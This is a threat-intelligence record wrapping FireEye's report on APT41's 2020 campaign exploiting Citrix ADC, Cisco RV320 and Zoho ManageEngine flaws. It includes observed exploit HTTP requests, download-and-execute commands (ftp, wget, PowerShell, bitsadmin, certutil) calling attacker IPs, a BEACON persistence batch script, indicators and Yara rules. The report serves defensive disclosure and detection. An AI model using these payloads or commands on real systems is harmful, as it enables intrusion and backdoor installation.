{
    "id": "c68b53e1-28d9-467d-a8ed-79d3f387ecbb",
    "created_at": "2022-10-25T16:48:17.35509Z",
    "updated_at": "2025-03-27T02:16:16.930982Z",
    "deleted_at": null,
    "sha1_hash": "60cdab19b8f87a9d3b1aa0dde91f9cf945cbfb76",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-03-26T23:57:05Z",
    "file_modification_date": "2020-03-26T23:57:05Z",
    "file_size": 209265,
    "plain_text": "# This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits\n\n**[fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)**\n\n[Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest](https://content.fireeye.com/apt-41/rpt-apt41/)\ncampaigns by a Chinese cyber espionage actor we have observed in recent years. Between\n[January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix](https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html)\n[NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye](https://nvd.nist.gov/vuln/detail/CVE-2020-10189)\ncustomers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France,\nIndia, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore,\nSweden, Switzerland, UAE, UK and USA. The following industries were targeted:\nBanking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High\nTechnology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas,\nPetrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and\nUtility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected\na subset of specific organizations to target, but the victims appear to be more targeted in nature.\n\n## Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])\n\nStarting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of\n[Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781](https://support.citrix.com/article/CTX267027)\n(published December 17, 2019).\n\nFigure 1: Timeline of key events\n\nThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved\nexecution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41.\n[First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied.](https://support.citrix.com/article/CTX267679)\nSecond, it may return architecture-related information that would be required knowledge for\nAPT41 to successfully deploy a backdoor in a follow-up step.\n\nOne interesting thing to note is that all observed requests were only performed against Citrix\ndevices, suggesting APT41 was operating with an already-known list of identified devices\naccessible on the internet.\n\n\n-----\n\n### POST /vpns/portal/scripts/newbm.pl HTTP/1.1 Host: [redacted] Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.22.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/[redacted] Content-Length: 96\n\n url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]\n\nFigure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nThere is a lull in APT41 activity between January 23 and February 1, which is likely related to the\nChinese Lunar New Year holidays which occurred between January 24 and January 30, 2020.\nThis has been a common activity pattern by Chinese APT groups in past years as well.\n\nStarting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that\ninitiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the\ncommand ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd’, which connected to\n66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a\npassword that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which\nwas likely a backdoor).\n\n### POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Accept-Encoding: identity Content-Length: 147 Connection: close Nsc_User: ../../../netscaler/portal/templates/[redacted] User-Agent: Python-urllib/2.7 Nsc_Nonce: nsroot Host: [redacted] Content-Type: application/x-www-form-urlencoded\n\n url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd`') %]\n\nFigure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nWe did not observe APT41 activity at FireEye customers between February 2 and February 19,\n2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January\n23 and January 24, and rolled out quarantines to additional provinces starting between February\n2 and February 10. While it is possible that this reduction in activity might be related to the\nCOVID-19 quarantine measures in China, APT41 may have remained active in other ways, which\n\n\n-----\n\nwe were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-201919781 exploitation on February 24 and February 25. The exploit behavior was almost identical to\nthe activity on February 1, where only the name of the payload ‘un’ changed.\n\n### POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Accept-Encoding: identity Content-Length: 145 Connection: close Nsc_User: ../../../netscaler/portal/templates/[redacted] User-Agent: Python-urllib/2.7 Nsc_Nonce: nsroot Host: [redacted] Content-Type: application/x-www-form-urlencoded\n\n url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un`') %]\n\nFigure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\n[Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24,](https://support.citrix.com/article/CTX267027)\n2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN\nWANOP.\n\n## Cisco Router Exploitation\n\nOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a\ntelecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown\nwhat specific exploit was used, but there is a Metasploit module that combines two CVE’s (CVE[2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325](https://nvd.nist.gov/vuln/detail/CVE-2019-1652)\nsmall business routers and uses wget to download the specified payload.\n\n### GET /test/fuc HTTP/1.1 Host: 66.42.98\\.220 User-Agent: Wget Connection: close\n\nFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget\n\n66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5:\nc0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the\ncommand one would execute on a Cisco RV320 router to display the current configuration.\n\nCisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and\nasks customers to review the following security advisories and take appropriate action:\n\n\n-----\n\n[Cisco Small Business RV320 and RV325 Routers Information Disclosure Vulnerability](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info)\n[Cisco Small Business RV320 and RV325 Routers Command Injection Vulnerability](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject)\n\n## Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)\n\n[On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-](https://twitter.com/steventseeley/status/1235635108498948096?s=20)\nconcept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop\n[Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed](https://nvd.nist.gov/vuln/detail/CVE-2020-10189)\nAPT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more\nthan a dozen FireEye customers, which resulted in the compromise of at least five separate\ncustomers. FireEye observed two separate variations of how the payloads (install.bat and\nstoresyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to\ndirectly upload “logger.zip”, a simple Java based program, which contained a set of commands to\nuse PowerShell to download and execute install.bat and storesyncsvc.dll.\n\n### java/lang/Runtime\n\n getRuntime\n\n ()Ljava/lang/Runtime;\n\n Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\ Windows\\Temp\\install.bat')&powershell $client = new-object System.Net.WebClient;$client.‐ DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll',' C:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat\n\n '(Ljava/lang/String;)Ljava/lang/Process;\n\n StackMapTable\n\n ysoserial/Pwner76328858520609\n\n Lysoserial/Pwner76328858520609;\n\nFigure 6: Contents of logger.zip\n\n[Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC.](https://github.com/frohoff/ysoserial)\nThe string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely\nused the POC as source material in their operation.\n\nIn the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin commandline tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known\nAPT41 infrastructure 66.42.98[.]220 on port 12345.\n\n\n-----\n\n### Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe\n\n Process Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat\n\nFigure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189\nexploitation\n\nIn both variations, the install.bat batch file was used to install persistence for a trial-version of\nCobalt Strike BEACON loader named storesyncsvc.dll (MD5:\n5909983db4d9023e4098e56361c96a6f).\n\n\n-----\n\n### @echo off\n\n set \"WORK_DIR=C:\\Windows\\System32\"\n\n set \"DLL_NAME=storesyncsvc.dll\"\n\n set \"SERVICE_NAME=StorSyncSvc\"\n\n set \"DISPLAY_NAME=Storage Sync Service\"\n\n set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\"\n\n sc stop %SERVICE_NAME%\n\n sc delete %SERVICE_NAME%\n\n mkdir %WORK_DIR%\n\n copy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Y\n\n reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /t REG_MULTI_SZ /d \"%SERVICE_NAME%\" /f\n\n sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"\n\n SC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000\n\n sc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\"\n\n reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parame‐ ters\" /f\n\n reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parame‐ ters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /f\n\n net start \"%SERVICE_NAME%\"\n\nFigure 8: Contents of install.bat\n\nStoresyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to\nexchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable\ncommand and control (C2) profile.\n\n\n-----\n\n### GET /jquery-3.3.1.min.js HTTP/1.1 Host: cdn.bootcss.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://cdn.bootcss.com/ Accept-Encoding: gzip, deflate Cookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRM‐ pJawYvnAhPJYM DA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZ‐ fu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko Connection: Keep-Alive Cache-Control: no-cache\n\nFigure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request\n\nWithin a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to\ndownload a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a\n[common TTP that we’ve observed APT41 use in past intrusions, which they then used to](https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html)\ndownload 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a\nVMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The\n[usage of VMProtected binaries is another very common TTP that we’ve observed this group](https://www.fireeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html)\nleverage in multiple intrusions in order to delay analysis of other tools in their toolkit.\n\n### GET /2.exe HTTP/1.1 Cache-Control: no-cache Connection: Keep-Alive Pragma: no-cache Accept: */* User-Agent: Microsoft-CryptoAPI/6.3 Host: 91.208.184[.]78\n\nFigure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader via\nCertUtil\n\n### certutil -urlcache -split -f http://91.208.184[.]78/2.exe\n\nFigure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloader\n\nThe Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over\nport 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt\nStrike BEACON (trial-version).\n\n### GET /TzGG HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0) Host: 91.208.184[.]78:443 Connection: Keep-Alive Cache-Control: no-cache\n\n\n-----\n\nFigure 12: Example HTTP request downloading ‘TzGG’ shellcode for Cobalt Strike BEACON\n\nThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We\nbelieve this is an example of the actor attempting to diversify post-exploitation access to the\ncompromised systems.\n\n[ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and](https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html)\n[subsequently released an update on March 7, 2020, with a long term fix.](https://www.manageengine.com/products/desktop-central/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb)\n\n## Outlook\n\nThis activity is one of the most widespread campaigns we have seen from China-nexus\nespionage actors in recent years. While APT41 has previously conducted activity with an\nextensive initial entry such as the trojanizing of NetSarang software, this scanning and\nexploitation has focused on a subset of our customers, and seems to reveal a high operational\ntempo and wide collection requirements for APT41.\n\nIt is notable that we have only seen these exploitation attempts leverage publicly available\nmalware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in\nprevious incidents APT41 has waited to deploy more advanced malware until they have fully\nunderstood where they were and carried out some initial reconnaissance. In 2020, APT41\ncontinues to be one of the most prolific threats that FireEye currently tracks. This new activity\nfrom this group shows how resourceful and how quickly they can leverage newly disclosed\nvulnerabilities to their advantage.\n\n[Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-](https://www.fireeye.com/solutions/managed-defense.html)\n[2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a unique](https://content.fireeye.com/apt-41/rpt-apt41/)\nstate-sponsored Chinese threat group that conducts espionage, the actor also conducts\nfinancially motivated activity for personal gain.\n\n## Indicators\n\n|Type|Indicator(s)|\n|---|---|\n\n\n-----\n\n|CVE-2019-19781 Exploita‐ tion (Citrix Application Deliv‐ ery Control)|66.42.98[.]220 CVE-2019-19781 exploitation attempts with a payload of ‘file /bin/pwd’ CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test: [redacted]\\@66.42.98[.]220/bsd’ CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test: [redacted]\\@66.42.98[.]220/un’ /tmp/bsd /tmp/un|\n|---|---|\n|Cisco Router Exploitation|66.42.98\\.220 ‘1.txt’ (MD5: c0c467c8e9b2046d7053642cc9bdd57d) ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc|\n\n\n-----\n\n|CVE-2020-10189 (Zoho ManageEngine Desktop Central)|66.42.98[.]220 91.208.184[.]78 74.82.201[.]8 exchange.dumb1[.]com install.bat (MD5: 7966c2c546b71e800397a67f942858d0) storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f) C:\\Windows\\Temp\\storesyncsvc.dll C:\\Windows\\Temp\\install.bat 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c) C:\\Users\\[redacted]\\install.bat TzGG (MD5: 659bd19b562059f3f0cc978e15624fd9) C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\ja‐ va.exe spawning cmd.exe and/or bitsadmin.exe Certutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78 PowerShell downloading files with Net.WebClient|\n|---|---|\n\n\n## Detecting the Techniques\n\nFireEye detects this activity across our platforms. This table contains several specific detection\nnames from a larger list of detections that were available prior to this activity occurring.\n\n|Platform|Signature Name|\n|---|---|\n|Endpoint Security|BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY) CERTUTIL.EXE DOWNLOADER A (UTILITY) Generic.mg.5909983db4d9023e Generic.mg.3e856162c36b5329 POWERSHELL DOWNLOADER (METHODOLOGY) SUSPICIOUS BITSADMIN USAGE B (METHODOLOGY)|\n\n\n-----\n\n|Network Security|Backdoor.Meterpreter DTI.Callback Exploit.CitrixNetScaler Trojan.METASTAGE Exploit.ZohoManageEngine.CVE-2020-10198.Pwner Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader|\n|---|---|\n|Helix|CITRIX ADC [Suspicious Commands] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success] EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access] EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning] MALWARE METHODOLOGY [Certutil User-Agent] WINDOWS METHODOLOGY [BITSadmin Transfer] WINDOWS METHODOLOGY [Certutil Downloader]|\n\n\n## MITRE ATT&CK Technique Mapping\n\n|ATT&CK|Techniques|\n|---|---|\n|Initial Access|External Remote Services (T1133), Exploit Public-Facing Application (T1190)|\n|Execu‐ tion|PowerShell (T1086), Scripting (T1064)|\n|Persis‐ tence|New Service (T1050)|\n|Privilege Escala‐ tion|Exploitation for Privilege Escalation (T1068)|\n|Defense Evasion|BITS Jobs (T1197), Process Injection (T1055)|\n\n\n### Com‐ mand And Control\n\n\n### Remote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071)\n\n\n-----\n\n## Appendix A: Discovery Rules\n\nThe following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the\nadversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all\ntradecraft-based discovery rules, we recommend deliberate testing and tuning prior to\nimplementation in any production system. Some of these rules are tailored to build concise\nhaystacks that are easy to review for high-fidelity detections. Some of these rules are broad in\naperture that build larger haystacks for further automation or processing in threat hunting\nsystems.\n\n### import \"pe\"\n\n rule ExportEngine_APT41_Loader_String\n\n {\n\n       meta:\n\n             author = \"@stvemillertime\"\n\n             description \"This looks for a common APT41 Export DLL name in BEA‐ CON shellcode loaders, such as loader_X86_svchost.dll\"\n\n       strings:\n\n             $pcre = /loader_[\\x00-\\x7F]{1,}\\x00/\n\n       condition:\n\n             uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DI‐ RECTORY_ENTRY_EXPORT].virtual_address) + 12))\n\n }\n\n rule ExportEngine_ShortName\n\n {\n\n   meta:\n\n     author = \"@stvemillertime\"\n\n     description = \"This looks for Win PEs where Export DLL name is a single character\"\n\n   strings:\n\n     $pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/\n\n   condition:\n\n     uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.r‐ va_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_EN‐ TRY_EXPORT].virtual_address) + 12))\n\n\n-----\n\n### }\n\n rule ExportEngine_xArch\n\n {\n\n   meta:\n\n     author = \"@stvemillertime\"\n\n     description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"\n\n       strings:\n\n       $pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/\n\n       condition:\n\n       uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTO‐ RY_ENTRY_EXPORT].virtual_address) + 12))\n\n }\n\n rule RareEquities_LibTomCrypt\n\n {\n\n   meta:\n\n     author = \"@stvemillertime\"\n\n     description = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch every‐ thing BEACON as well. You may want to exclude Golang and UPX packed samples.\"\n\n   strings:\n\n     $a1 = \"LibTomMath\"\n\n   condition:\n\n     uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1\n\n }\n\n rule RareEquities_KCP\n\n {\n\n   meta:\n\n     author = \"@stvemillertime\"\n\n\n-----\n\n###     description = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP, https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"\n\n   strings:\n\n     $a01 = \"[RO] %ld bytes\"\n\n     $a02 = \"recv sn=%lu\"\n\n     $a03 = \"[RI] %d bytes\"\n\n     $a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\"\n\n     $a05 = \"input psh: sn=%lu ts=%lu\"\n\n     $a06 = \"input probe\"\n\n     $a07 = \"input wins: %lu\"\n\n     $a08 = \"rcv_nxt=%lu\\\\n\"\n\n     $a09 = \"snd(buf=%d, queue=%d)\\\\n\"\n\n     $a10 = \"rcv(buf=%d, queue=%d)\\\\n\"\n\n     $a11 = \"rcvbuf\"\n\n   condition:\n\n     (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize < 5MB and 3 of ($a*)\n\n }\n\n rule ConventionEngine_Term_Users\n\n {\n\n       meta:\n\n             author = \"@stvemillertime\"\n\n             description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"\n\n             sample_md5 = \"09e4e6fa85b802c46bc121fcaecc5666\"\n\n             ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/de‐ finitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"\n\n       strings:\n\n             $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Users[\\x00- \\xFF]{0,200}\\.pdb\\x00/ nocase ascii\n\n       condition:\n\n\n-----\n\n###             (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre\n\n }\n\n rule ConventionEngine_Term_Desktop\n\n {\n\n       meta:\n\n             author = \"@stvemillertime\"\n\n             description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"\n\n             sample_md5 = \"71cdba3859ca8bd03c1e996a790c04f9\"\n\n             ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/de‐ finitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"\n\n       strings:\n\n             $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Desktop[\\x00- \\xFF]{0,200}\\.pdb\\x00/ nocase ascii\n\n       condition:\n\n             (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre\n\n }\n\n rule ConventionEngine_Anomaly_MultiPDB_Double\n\n {\n\n       meta:\n\n             author = \"@stvemillertime\"\n\n             description = \"Searching for PE files with PDB path keywords, terms or anomalies.\"\n\n             sample_md5 = \"013f3bde3f1022b6cf3f2e541d19353c\"\n\n             ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/de‐ finitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\"\n\n       strings:\n\n             $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}\\.pdb\\x00/\n\n       condition:\n\n             (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2\n\n\n-----\n\n### }\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.03.25_APT41-initiates-global-intrusion-campaign/This%20Is%C2%A0Not%20a%20Test_%20APT41%20Initiates%20Global%20Intrusion%20Campaign%20Using%20Multiple%20Exploits%20_%20FireEye%20Inc.pdf"
    ],
    "report_names": [
        "This Is Not a Test_ APT41 Initiates Global Intrusion Campaign Using Multiple Exploits _ FireEye Inc"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c7d9878a-e691-4c6f-81ae-84fb115a1345",
            "created_at": "2022-10-25T16:07:23.359506Z",
            "updated_at": "2025-03-27T02:02:09.752427Z",
            "deleted_at": null,
            "main_name": "APT 41",
            "aliases": [
                "BrazenBamboo",
                "Bronze Atlas",
                "Double Dragon",
                "Earth Baku",
                "Grayfly",
                "Operation ColunmTK",
                "Operation CuckooBees",
                "Operation ShadowHammer",
                "Red Kelpie",
                "SparklingGoblin",
                "TA415",
                "TG-2633"
            ],
            "source_name": "ETDA:APT 41",
            "tools": [
                "9002 RAT",
                "ADORE.XSEC",
                "ASPXSpy",
                "ASPXTool",
                "AceHash",
                "Agent.dhwf",
                "Agentemis",
                "AndroidControl",
                "AngryRebel",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BLUEBEAM",
                "Barlaiy",
                "BlackCoffee",
                "Bladabindi",
                "BleDoor",
                "CCleaner Backdoor",
                "CHINACHOPPER",
                "COLDJAVA",
                "China Chopper",
                "ChyNode",
                "Cobalt Strike",
                "CobaltStrike",
                "Crackshot",
                "CrossWalk",
                "CurveLast",
                "CurveLoad",
                "DAYJOB",
                "DBoxAgent",
                "DEADEYE",
                "DEADEYE.APPEND",
                "DEADEYE.EMBED",
                "DEPLOYLOG",
                "DIRTCLEANER",
                "DUSTTRAP",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "DodgeBox",
                "DragonEgg",
                "ELFSHELF",
                "EasyNight",
                "Farfli",
                "FunnySwitch",
                "Gh0st RAT",
                "Ghost RAT",
                "HDD Rootkit",
                "HDRoot",
                "HKDOOR",
                "HOMEUNIX",
                "HUI Loader",
                "HidraQ",
                "HighNoon",
                "HighNote",
                "Homux",
                "Hydraq",
                "Jorik",
                "Jumpall",
                "KEYPLUG",
                "Kaba",
                "Korplug",
                "LATELUNCH",
                "LOLBAS",
                "LOLBins",
                "LightSpy",
                "Living off the Land",
                "Lowkey",
                "McRAT",
                "MdmBot",
                "MessageTap",
                "Meterpreter",
                "Mimikatz",
                "MoonBounce",
                "MoonWalk",
                "Motnug",
                "Moudour",
                "Mydoor",
                "NTDSDump",
                "PACMAN",
                "PCRat",
                "PINEGROVE",
                "PNGRAT",
                "POISONPLUG",
                "POISONPLUG.SHADOW",
                "POTROAST",
                "PRIVATELOG",
                "PipeMon",
                "PlugX",
                "PortReuse",
                "ProxIP",
                "ROCKBOOT",
                "RbDoor",
                "RedDelta",
                "RedXOR",
                "RibDoor",
                "Roarur",
                "RouterGod",
                "SAGEHIRE",
                "SPARKLOG",
                "SQLULDR2",
                "STASHLOG",
                "SWEETCANDLE",
                "ScrambleCross",
                "Sensocode",
                "SerialVlogger",
                "ShadowHammer",
                "ShadowPad Winnti",
                "SinoChopper",
